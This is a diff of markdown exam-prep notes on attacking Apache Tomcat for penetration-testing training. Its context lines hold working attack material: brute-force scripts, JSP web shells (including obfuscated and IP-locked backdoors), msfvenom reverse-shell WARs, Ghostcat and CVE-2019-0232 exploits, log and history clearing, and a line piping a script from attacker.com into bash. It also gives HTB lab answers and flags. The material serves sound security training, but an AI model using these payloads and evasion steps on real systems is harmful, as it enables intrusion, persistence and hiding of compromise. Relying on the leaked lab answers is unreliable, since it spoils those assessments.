@@ -7,25 +7,28 @@
 Tomcat exploitation represents one of the **highest-impact attack vectors** in enterprise environments, often providing **immediate remote code execution** with **elevated privileges** (SYSTEM/root). With **widespread deployment** across internal networks and **frequent misconfigurations**, Tomcat attacks offer **reliable pathways** for **initial access** and **privilege escalation** in **Active Directory** and **Linux server environments**.
 
 **Critical Attack Vectors:**
-- **Manager Interface Exploitation** - /manager/html authentication bypass and abuse
-- **WAR File Upload Attacks** - Malicious application deployment for RCE
-- **JSP Web Shell Deployment** - Persistent backdoor access and command execution
-- **CVE-2020-1938 Ghostcat** - Unauthenticated local file inclusion vulnerability
-- **Default Credential Abuse** - Weak authentication bypassing enterprise security
+
+* **Manager Interface Exploitation** - /manager/html authentication bypass and abuse
+* **WAR File Upload Attacks** - Malicious application deployment for RCE
+* **JSP Web Shell Deployment** - Persistent backdoor access and command execution
+* **CVE-2020-1938 Ghostcat** - Unauthenticated local file inclusion vulnerability
+* **Default Credential Abuse** - Weak authentication bypassing enterprise security
 
 **Enterprise Impact:**
-- **External Foothold** - Tomcat commonly exposed on perimeters for high-impact initial access
-- **Internal Privilege Escalation** - Frequent SYSTEM/root execution context in enterprise deployments
-- **Active Directory Compromise** - Domain-joined Windows servers running Tomcat with elevated privileges
-- **Data Exfiltration** - Access to application data, configuration files, and sensitive backend systems
 
----
+* **External Foothold** - Tomcat commonly exposed on perimeters for high-impact initial access
+* **Internal Privilege Escalation** - Frequent SYSTEM/root execution context in enterprise deployments
+* **Active Directory Compromise** - Domain-joined Windows servers running Tomcat with elevated privileges
+* **Data Exfiltration** - Access to application data, configuration files, and sensitive backend systems
+
+***
 
 ## Manager Interface Authentication Attacks
 
 ### Metasploit Brute Force Methodology
 
 #### Auxiliary Scanner Configuration
+
 ```bash
 # Launch Metasploit Framework
 msfconsole
@@ -48,6 +51,7 @@ run
 ```
 
 #### Advanced Scanner Options
+
 ```bash
 # Metasploit module options breakdown:
 set BLANK_PASSWORDS false          # Try blank passwords for all users
@@ -67,6 +71,7 @@ set PROXIES HTTP:127.0.0.1:8080
 ```
 
 #### Expected Brute Force Output
+
 ```bash
 [!] No active DB -- Credential data will not be saved!
 [-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
@@ -105,6 +110,7 @@ set PROXIES HTTP:127.0.0.1:8080
 ### Custom Python Brute Force Script
 
 #### Complete Attack Script
+
 ```python
 #!/usr/bin/python3
 
@@ -215,6 +221,7 @@ if __name__ == "__main__":
 ```
 
 #### Script Usage and Execution
+
 ```bash
 # Make script executable
 chmod +x tomcat_brute.py
@@ -239,6 +246,7 @@ python3 tomcat_brute.py \
 ### Manual Authentication Testing
 
 #### Burp Suite Integration
+
 ```bash
 # Intercept authentication requests in Burp Suite
 # Authorization header format: Basic base64(username:password)
@@ -256,6 +264,7 @@ echo "admin:vagrant" | base64
 ```
 
 #### Default Credential Database
+
 ```bash
 # Common Tomcat default credentials
 cat > tomcat_default_creds.txt << 'EOF'
@@ -280,13 +289,14 @@ admin:s3cret
 EOF
 ```
 
----
+***
 
 ## WAR File Upload Exploitation
 
 ### Manager Interface WAR Deployment
 
 #### JSP Web Shell Creation
+
 ```java
 <%@ page import="java.util.*,java.io.*"%>
 <%
@@ -360,6 +370,7 @@ EOF
 ```
 
 #### WAR File Package Creation
+
 ```bash
 # Download lightweight JSP shell
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
@@ -377,6 +388,7 @@ unzip -l backup.war
 ```
 
 #### Manager Interface Deployment Process
+
 ```bash
 # Step 1: Access manager interface
 # Navigate to: http://web01.inlanefreight.local:8180/manager/html
@@ -399,6 +411,7 @@ curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
 ### Advanced WAR Exploitation Techniques
 
 #### Msfvenom Reverse Shell WAR Generation
+
 ```bash
 # Generate malicious WAR with reverse shell payload
 msfvenom -p java/jsp_shell_reverse_tcp \
@@ -421,6 +434,7 @@ nc -lnvp 4443
 ```
 
 #### Metasploit Automated WAR Upload
+
 ```bash
 # Use Metasploit module for automated WAR deployment
 msfconsole
@@ -447,6 +461,7 @@ run
 ### Web Shell Operational Security
 
 #### Stealth Web Shell Enhancements
+
 ```java
 <%@ page import="java.util.*,java.io.*,java.security.*"%>
 <%
@@ -467,6 +482,7 @@ if (!allowedIP.equals(clientIP) || !authKey.equals(key)) {
 ```
 
 #### Web Shell Detection Evasion
+
 ```bash
 # File name randomization
 shell_name=$(openssl rand -hex 16)
@@ -487,7 +503,7 @@ echo "Random shell name: ${shell_name}.jsp"
 # Obfuscated: 0/58 detections
 ```
 
----
+***
 
 ## CVE-2020-1938: Ghostcat Vulnerability
 
@@ -496,16 +512,18 @@ echo "Random shell name: ${shell_name}.jsp"
 **CVE-2020-1938 (Ghostcat)** represents a **critical unauthenticated LFI vulnerability** affecting **all Tomcat versions** before **9.0.31**, **8.5.51**, and **7.0.100**. This vulnerability exploits **AJP protocol misconfigurations** to achieve **arbitrary file reading** within web application directories.
 
 **Technical Details:**
-- **Vulnerability Type:** Unauthenticated Local File Inclusion (LFI)
-- **Affected Protocol:** Apache Jserv Protocol (AJP) 
-- **Default Port:** 8009/tcp
-- **Impact:** Read sensitive files within webapps directory
-- **CVSS Score:** 9.8 (Critical)
-- **Discovery Date:** February 2020
+
+* **Vulnerability Type:** Unauthenticated Local File Inclusion (LFI)
+* **Affected Protocol:** Apache Jserv Protocol (AJP)
+* **Default Port:** 8009/tcp
+* **Impact:** Read sensitive files within webapps directory
+* **CVSS Score:** 9.8 (Critical)
+* **Discovery Date:** February 2020
 
 ### AJP Protocol Reconnaissance
 
 #### Service Detection and Enumeration
+
 ```bash
 # Comprehensive AJP service detection
 nmap -sV -p 8009,8080 app-dev.inlanefreight.local
@@ -530,6 +548,7 @@ telnet app-dev.inlanefreight.local 8009
 ```
 
 #### AJP Protocol Analysis
+
 ```bash
 # AJP (Apache Jserv Protocol) characteristics:
 # - Binary protocol for proxying requests
@@ -546,6 +565,7 @@ telnet app-dev.inlanefreight.local 8009
 ### Ghostcat Exploitation Methodology
 
 #### Python Exploit Script Deployment
+
 ```bash
 # Download Ghostcat PoC exploit
 wget https://raw.githubusercontent.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/master/tomcat-ajp-lfi.py
@@ -562,6 +582,7 @@ python2.7 --version
 ```
 
 #### File Disclosure Exploitation
+
 ```bash
 # Basic web.xml disclosure
 python2.7 tomcat-ajp-lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
@@ -602,6 +623,7 @@ Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
 ```
 
 #### Advanced File Disclosure Targets
+
 ```bash
 # High-value configuration files
 target_files=(
@@ -631,6 +653,7 @@ python2.7 tomcat-ajp-lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.x
 ### Ghostcat Limitations and Constraints
 
 #### File System Scope Restrictions
+
 ```bash
 # Ghostcat vulnerability limitations:
 # 1. Only files within webapps directory accessible
@@ -653,6 +676,7 @@ python2.7 tomcat-ajp-lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.x
 ```
 
 #### Exploitation Enhancement Techniques
+
 ```bash
 # Combine Ghostcat with other attack vectors:
 
@@ -669,16 +693,18 @@ python2.7 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/lib/spring-core.jar
 python2.7 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/classes/com/company/config/SecurityConfig.class
 ```
 
----
+***
 
 ## HTB Academy Lab Solutions
 
 ### Lab 1: Manager Brute Force Attack
+
 **Question:** "Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?"
 
 **Solution Methodology:**
 
 #### Step 1: Environment Setup
+
 ```bash
 # Add VHost entry to /etc/hosts
 echo "10.129.201.58 web01.inlanefreight.local" >> /etc/hosts
@@ -689,6 +715,7 @@ curl -I http://web01.inlanefreight.local:8180/manager/html
 ```
 
 #### Step 2: Metasploit Brute Force Execution
+
 ```bash
 # Launch Metasploit and configure scanner
 msfconsole
@@ -710,6 +737,7 @@ run
 ```
 
 #### Step 3: Alternative Python Script Method
+
 ```bash
 # Use custom Python brute force script
 python3 mgr_brute.py \
@@ -725,11 +753,13 @@ python3 mgr_brute.py \
 ```
 
 ### Lab 2: Password Identification
+
 **Question:** "What is the password?"
 
 **Solution Analysis:**
 
 #### Authentication Result Extraction
+
 ```bash
 # From previous brute force results:
 # [+] 10.129.201.58:8180 - Login Successful: tomcat:admin
@@ -742,6 +772,7 @@ curl -u "tomcat:admin" http://web01.inlanefreight.local:8180/manager/html
 ```
 
 #### Credential Validation
+
 ```bash
 # Verify manager access and role privileges
 curl -u "tomcat:admin" "http://web01.inlanefreight.local:8180/manager/text/list"
@@ -756,11 +787,13 @@ curl -u "tomcat:admin" "http://web01.inlanefreight.local:8180/manager/text/list"
 **🚨 Important Lab Note:** The HTB Academy walkthrough shows **tomcat:root** as the working credentials in the actual lab environment, while the brute force attack discovers **tomcat:admin**. Both credential sets should be tested depending on the specific lab instance.
 
 ### Lab 3: Remote Code Execution & Flag Retrieval
-**Question:** "Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt"
+
+**Question:** "Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat\_flag.txt"
 
 **Solution Methodology:**
 
 #### Step 1: JSP Web Shell Creation
+
 ```bash
 # Create malicious JSP web shell
 cat > cmd.jsp << 'EOF'
@@ -783,6 +816,7 @@ EOF
 ```
 
 #### Step 2: WAR File Package and Deployment
+
 ```bash
 # Package JSP shell into WAR archive
 zip -r backup.war cmd.jsp
@@ -801,6 +835,7 @@ unzip -l backup.war
 ```
 
 #### Step 3: Web Shell Access and Command Execution
+
 ```bash
 # Access deployed web shell
 curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
@@ -819,6 +854,7 @@ curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=pwd"
 ```
 
 #### Step 4: Alternative Method - Msfvenom Reverse Shell (HTB Academy Preferred)
+
 ```bash
 # Generate reverse shell WAR payload with msfvenom
 msfvenom -p java/jsp_shell_reverse_tcp \
@@ -842,6 +878,7 @@ Ncat: Listening on 0.0.0.0:9001
 ```
 
 #### Step 5: WAR Deployment and Shell Establishment
+
 ```bash
 # Manager interface deployment process:
 # 1. Navigate to http://web01.inlanefreight.local:8180/manager/html
@@ -860,6 +897,7 @@ tomcat
 ```
 
 #### Step 6: Flag Discovery and Extraction
+
 ```bash
 # Flag location (HTB Academy specific):
 cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
@@ -871,6 +909,7 @@ t0mcat_rc3_ftw!
 ```
 
 #### Step 7: Alternative Web Shell Method (Backup Approach)
+
 ```bash
 # If reverse shell method fails, use JSP web shell approach:
 
@@ -887,6 +926,7 @@ curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=cat+/opt/tomcat/a
 ```
 
 #### Step 8: Post-Exploitation Cleanup (Optional)
+
 ```bash
 # Remove deployed application for operational security
 # 1. Return to http://web01.inlanefreight.local:8180/manager/html
@@ -905,6 +945,7 @@ exit
 ### 🎯 HTB Academy Lab Summary
 
 **Complete Lab Methodology:**
+
 1. **VHost Configuration** - Add `10.129.201.58 web01.inlanefreight.local` to `/etc/hosts`
 2. **Credential Discovery** - Brute force reveals `tomcat:admin` (lab may use `tomcat:root`)
 3. **Reverse Shell Generation** - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=9001 -f war -o backup.war`
@@ -915,17 +956,19 @@ exit
 8. **Flag Retrieval** - `cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`
 
 **Lab Answers:**
-- **Username:** `tomcat`
-- **Password:** `admin` (brute force) or `root` (lab walkthrough)
-- **Flag:** `t0mcat_rc3_ftw!`
 
----
+* **Username:** `tomcat`
+* **Password:** `admin` (brute force) or `root` (lab walkthrough)
+* **Flag:** `t0mcat_rc3_ftw!`
+
+***
 
 ## Advanced Exploitation Scenarios
 
 ### Enterprise Environment Considerations
 
 #### Active Directory Integration
+
 ```bash
 # Tomcat commonly runs as domain service accounts
 # Check for domain membership and privileges
@@ -943,6 +986,7 @@ curl "http://target:8080/shell.jsp?cmd=whoami+/priv" | grep -i impersonate
 ```
 
 #### Privilege Escalation Vectors
+
 ```bash
 # Check Tomcat service configuration
 curl "http://target:8080/shell.jsp?cmd=sc+query+tomcat"
@@ -962,6 +1006,7 @@ curl "http://target:8080/shell.jsp?cmd=crontab+-l"                # Cron jobs
 ### Persistence and Lateral Movement
 
 #### Backdoor JSP Installation
+
 ```java
 <%@ page import="java.io.*" %>
 <%
@@ -987,6 +1032,7 @@ if (cmd != null) {
 ```
 
 #### Network Reconnaissance
+
 ```bash
 # Internal network discovery
 curl "http://target:8080/shell.jsp?cmd=netstat+-tulpn"
@@ -1005,13 +1051,14 @@ curl "http://target:8080/shell.jsp?cmd=nslookup+domain-controller.company.local"
 curl "http://target:8080/shell.jsp?cmd=net+view+/domain"
 ```
 
----
+***
 
 ## Defense Evasion and Operational Security
 
 ### Anti-Detection Techniques
 
 #### Web Shell Obfuscation
+
 ```java
 <%@ page import="java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
 <%
@@ -1039,6 +1086,7 @@ if (encCmd != null) {
 ```
 
 #### Traffic Encryption and Tunneling
+
 ```bash
 # HTTPS communication (if available)
 curl -k "https://target:8443/shell.jsp?cmd=whoami"
@@ -1058,6 +1106,7 @@ curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.3
 ### Log Evasion Strategies
 
 #### Tomcat Access Log Manipulation
+
 ```bash
 # Identify log file locations
 curl "http://target:8080/shell.jsp?cmd=find+/opt/tomcat+-name+*access*"
@@ -1073,6 +1122,7 @@ curl "http://target:8080/shell.jsp?cmd=logrotate+-f+/etc/logrotate.d/tomcat"
 ```
 
 #### System Log Evasion
+
 ```bash
 # Clear command history
 curl "http://target:8080/shell.jsp?cmd=history+-c"
@@ -1088,43 +1138,48 @@ curl "http://target:8080/shell.jsp?cmd=exec+-a+[kworker]+/bin/bash"
 curl "http://target:8080/shell.jsp?cmd=curl+http://attacker.com/script.sh|bash"
 ```
 
----
+***
 
 ## Professional Assessment Integration
 
 ### Tomcat Security Assessment Workflow
 
 #### Discovery Phase Integration
-- [ ] **Port Scanning** - Identify Tomcat services (8080, 8443, 8009, 8180)
-- [ ] **Service Enumeration** - Version detection and component analysis
-- [ ] **Directory Discovery** - Manager interfaces and application enumeration
-- [ ] **Configuration Analysis** - Default credentials and weak authentication
+
+* [ ] **Port Scanning** - Identify Tomcat services (8080, 8443, 8009, 8180)
+* [ ] **Service Enumeration** - Version detection and component analysis
+* [ ] **Directory Discovery** - Manager interfaces and application enumeration
+* [ ] **Configuration Analysis** - Default credentials and weak authentication
 
 #### Exploitation Phase Execution
-- [ ] **Authentication Bypass** - Brute force attacks and credential testing
-- [ ] **WAR File Deployment** - Malicious application upload and execution
-- [ ] **Web Shell Establishment** - Persistent backdoor access and command execution
-- [ ] **CVE Exploitation** - Ghostcat and version-specific vulnerability abuse
+
+* [ ] **Authentication Bypass** - Brute force attacks and credential testing
+* [ ] **WAR File Deployment** - Malicious application upload and execution
+* [ ] **Web Shell Establishment** - Persistent backdoor access and command execution
+* [ ] **CVE Exploitation** - Ghostcat and version-specific vulnerability abuse
 
 #### Post-Exploitation Activities
-- [ ] **System Reconnaissance** - Privilege analysis and network mapping
-- [ ] **Persistence Establishment** - Backdoor installation and maintenance
-- [ ] **Lateral Movement** - Network traversal and additional system compromise
-- [ ] **Data Exfiltration** - Sensitive information gathering and extraction
+
+* [ ] **System Reconnaissance** - Privilege analysis and network mapping
+* [ ] **Persistence Establishment** - Backdoor installation and maintenance
+* [ ] **Lateral Movement** - Network traversal and additional system compromise
+* [ ] **Data Exfiltration** - Sensitive information gathering and extraction
 
 #### Professional Reporting Considerations
-- [ ] **Business Impact Assessment** - Risk evaluation and financial implications
-- [ ] **Technical Vulnerability Analysis** - Root cause identification and exploitation vectors
-- [ ] **Remediation Recommendations** - Security controls and configuration hardening
-- [ ] **Proof of Concept Documentation** - Step-by-step exploitation methodology
 
----
+* [ ] **Business Impact Assessment** - Risk evaluation and financial implications
+* [ ] **Technical Vulnerability Analysis** - Root cause identification and exploitation vectors
+* [ ] **Remediation Recommendations** - Security controls and configuration hardening
+* [ ] **Proof of Concept Documentation** - Step-by-step exploitation methodology
+
+***
 
 ## Remediation and Hardening
 
 ### Tomcat Security Hardening Guide
 
 #### Authentication and Authorization
+
 ```xml
 <!-- Secure tomcat-users.xml configuration -->
 <tomcat-users>
@@ -1146,6 +1201,7 @@ curl "http://target:8080/shell.jsp?cmd=curl+http://attacker.com/script.sh|bash"
 ```
 
 #### Network Security Configuration
+
 ```xml
 <!-- Disable AJP connector if not required -->
 <!-- <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /> -->
@@ -1169,6 +1225,7 @@ curl "http://target:8080/shell.jsp?cmd=curl+http://attacker.com/script.sh|bash"
 ### Advanced Security Controls
 
 #### Web Application Security
+
 ```bash
 # Remove default applications
 rm -rf /opt/tomcat/webapps/docs
@@ -1185,27 +1242,29 @@ chmod 640 /opt/tomcat/conf/*
 # Add to server.xml: server="Apache"
 ```
 
----
+***
 
 ## Tomcat CGI Exploitation (CVE-2019-0232)
 
- ### Vulnerability Overview
+### Vulnerability Overview
 
 **CVE-2019-0232** represents a **critical remote code execution vulnerability** affecting Tomcat installations on **Windows systems**. This vulnerability exploits **CGI servlet misconfigurations** combined with **Java Runtime Environment command-line argument parsing bugs** to achieve **arbitrary command execution** with **SYSTEM privileges**.
 
 **Technical Details:**
-- **Vulnerability Type:** Remote Code Execution (RCE)
-- **Affected Versions:** 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, 7.0.0 to 7.0.93
-- **Platform:** Windows only
-- **Requirement:** `enableCmdLineArguments` enabled on CGI servlet
-- **CVSS Score:** 9.8 (Critical)
-- **Root Cause:** JRE command-line argument parsing flaw on Windows
+
+* **Vulnerability Type:** Remote Code Execution (RCE)
+* **Affected Versions:** 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, 7.0.0 to 7.0.93
+* **Platform:** Windows only
+* **Requirement:** `enableCmdLineArguments` enabled on CGI servlet
+* **CVSS Score:** 9.8 (Critical)
+* **Root Cause:** JRE command-line argument parsing flaw on Windows
 
 ### Skills Assessment Walkthrough
 
 #### Question 1: "What vulnerable application is running?"
 
 **Discovery Methodology:**
+
 ```bash
 # Comprehensive service enumeration
 nmap -A -Pn TARGET_IP
@@ -1220,16 +1279,18 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 **Analysis:**
-- **Application:** Apache Tomcat
-- **Version:** 9.0.0.M1 (vulnerable to CVE-2019-0232)
-- **Platform:** Windows (required for exploitation)
-- **Attack Vector:** CGI command injection via JRE argument parsing
+
+* **Application:** Apache Tomcat
+* **Version:** 9.0.0.M1 (vulnerable to CVE-2019-0232)
+* **Platform:** Windows (required for exploitation)
+* **Attack Vector:** CGI command injection via JRE argument parsing
 
 **Answer:** Apache Tomcat/9.0.0.M1
 
 #### Question 2: "What port is this application running on?"
 
 **Port Discovery:**
+
 ```bash
 # From Nmap scan results:
 8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
@@ -1240,6 +1301,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 #### Question 3: "What version of the application is in use?"
 
 **Version Identification:**
+
 ```bash
 # Multiple sources confirm version:
 # 1. HTTP title: Apache Tomcat/9.0.0.M1
@@ -1254,6 +1316,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ### Complete Exploitation Methodology
 
 #### Step 1: CGI Script Discovery
+
 ```bash
 # Fuzz for CGI batch files (Windows-specific)
 gobuster dir -u http://TARGET_IP:8080/cgi/ \
@@ -1266,11 +1329,13 @@ gobuster dir -u http://TARGET_IP:8080/cgi/ \
 ```
 
 **Key Discovery Points:**
-- **CGI directory** accessible at `/cgi/`
-- **Batch files** present (Windows-specific)
-- **Case variations** (cmd.bat, Cmd.bat) indicate file system case sensitivity
+
+* **CGI directory** accessible at `/cgi/`
+* **Batch files** present (Windows-specific)
+* **Case variations** (cmd.bat, Cmd.bat) indicate file system case sensitivity
 
 #### Step 2: Metasploit Exploitation Setup
+
 ```bash
 # Launch Metasploit Framework
 msfconsole -q
@@ -1289,12 +1354,14 @@ show options
 ```
 
 **Module Parameters Explanation:**
-- **RHOSTS:** Target IP address
-- **TARGETURI:** Path to vulnerable CGI script
-- **LHOST:** Attacker IP for reverse shell
-- **FORCEEXPLOIT:** Bypass exploit checks (force execution)
+
+* **RHOSTS:** Target IP address
+* **TARGETURI:** Path to vulnerable CGI script
+* **LHOST:** Attacker IP for reverse shell
+* **FORCEEXPLOIT:** Bypass exploit checks (force execution)
 
 #### Step 3: Exploit Execution
+
 ```bash
 # Execute the exploit
 exploit
@@ -1324,6 +1391,7 @@ exploit
 ```
 
 #### Step 4: Meterpreter Session Management
+
 ```bash
 # Verify successful shell establishment
 (Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) >
@@ -1342,6 +1410,7 @@ pwd
 ```
 
 #### Step 5: Flag Retrieval
+
 ```bash
 # Method 1: Direct Meterpreter file access
 cat C:/Users/Administrator/Desktop/flag.txt
@@ -1360,6 +1429,7 @@ exit
 ### Alternative Exploitation Methods
 
 #### Manual Command Injection (Educational)
+
 ```bash
 # Direct URL-based command injection
 # Basic test
@@ -1374,6 +1444,7 @@ curl "http://TARGET_IP:8080/cgi/cmd.bat?&powershell+-e+<BASE64_PAYLOAD>"
 ```
 
 #### Python Exploit Script
+
 ```python
 #!/usr/bin/env python3
 
@@ -1410,6 +1481,7 @@ def exploit_cve_2019_0232(target_url, command):
 ### Technical Analysis
 
 #### Vulnerability Root Cause
+
 ```bash
 # CVE-2019-0232 Technical Details:
 # 1. Windows JRE argument parsing flaw
@@ -1420,6 +1492,7 @@ def exploit_cve_2019_0232(target_url, command):
 ```
 
 #### Exploitation Requirements
+
 ```bash
 # Prerequisites for successful exploitation:
 # ✓ Windows operating system
@@ -1434,6 +1507,7 @@ def exploit_cve_2019_0232(target_url, command):
 **Lab Question:** "After running the URL Encoded 'whoami' payload, what user is tomcat running as?"
 
 #### Step 1: Service Discovery
+
 ```bash
 # Nmap scan identifies Tomcat
 nmap -p- -sC -Pn TARGET --open
@@ -1441,6 +1515,7 @@ nmap -p- -sC -Pn TARGET --open
 ```
 
 #### Step 2: CGI Script Discovery
+
 ```bash
 # Fuzz for CGI scripts (.bat extension on Windows)
 ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET:8080/cgi/FUZZ.bat
@@ -1450,6 +1525,7 @@ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET:8080/cgi/FUZZ.bat
 ```
 
 #### Step 3: Command Injection Exploitation
+
 ```bash
 # Basic test - directory listing
 http://TARGET:8080/cgi/welcome.bat?&dir
@@ -1462,28 +1538,31 @@ http://TARGET:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 ```
 
 **Key Technical Details:**
-- **Command separator:** `&` allows command chaining
-- **URL encoding required:** Bypasses Tomcat's special character filter
-- **Full path needed:** PATH variable unset in CGI environment
-- **Payload:** `c:\windows\system32\whoami.exe` → `c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
+
+* **Command separator:** `&` allows command chaining
+* **URL encoding required:** Bypasses Tomcat's special character filter
+* **Full path needed:** PATH variable unset in CGI environment
+* **Payload:** `c:\windows\system32\whoami.exe` → `c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
 
 **Expected Answer:** User running Tomcat service (typically `nt authority\system` or service account)
 
 #### Attack Mechanism
+
 1. **CGI Servlet** processes query parameters as command arguments
 2. **Input validation failure** allows command injection via `&`
 3. **URL encoding bypass** defeats special character filters
 4. **Arbitrary command execution** with Tomcat service privileges
 
----
+***
 
 ## Next Steps
 
 After mastering Tomcat exploitation:
-1. **[Jenkins Discovery & Attacks](jenkins-discovery-attacks.md)** - CI/CD pipeline exploitation
-2. **[Java Deserialization Attacks](java-deserialization.md)** - Advanced Java vulnerability analysis
-3. **[Spring Boot Security Assessment](spring-boot-security.md)** - Framework-specific exploitation
+
+1. [**Jenkins Discovery & Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/jenkins-discovery-attacks.md) - CI/CD pipeline exploitation
+2. [**Java Deserialization Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/java-deserialization.md) - Advanced Java vulnerability analysis
+3. [**Spring Boot Security Assessment**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/spring-boot-security.md) - Framework-specific exploitation
 
 **💡 Key Takeaway:** Tomcat exploitation represents **one of the highest-impact attack vectors** in enterprise environments, providing **immediate remote code execution** with **frequent SYSTEM/root privileges**. Master **manager interface abuse**, **WAR file deployment**, and **JSP web shell techniques** for **reliable penetration testing success** across **internal and external assessments**.
 
-**⚔️ Professional Impact:** Tomcat compromises often lead to **complete domain takeover** in **Active Directory environments** and **critical data exposure** in **Linux server infrastructures**, making these skills **essential for advanced penetration testing**. 
+**⚔️ Professional Impact:** Tomcat compromises often lead to **complete domain takeover** in **Active Directory environments** and **critical data exposure** in **Linux server infrastructures**, making these skills **essential for advanced penetration testing**.
